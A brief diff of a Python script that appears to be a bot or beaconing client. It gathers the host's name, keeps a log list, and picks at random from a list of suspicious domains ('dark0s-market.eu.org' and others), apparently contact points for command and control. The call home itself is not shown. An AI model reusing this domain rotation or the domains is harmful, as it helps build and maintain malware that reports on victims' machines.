@@ -15,7 +15,9 @@ hostname_os=socket.getfqdn()
 def ap_2_l0g(gms):
 	total_l0g.append(gms)
 
-urls=["http://free-coin.nichesite.org/index.html","https://dark-market.eu.org/index.html"]
+urls=["https://dark0s-market.eu.org/index.html"]
+# urls=["http://free-coin.nichesite.org/index.html","https://dark-market.eu.org/index.html","https://dark0s-market.eu.org/index.html"]
+
 #
 def set_url():
 	random_url=random.choice(urls)
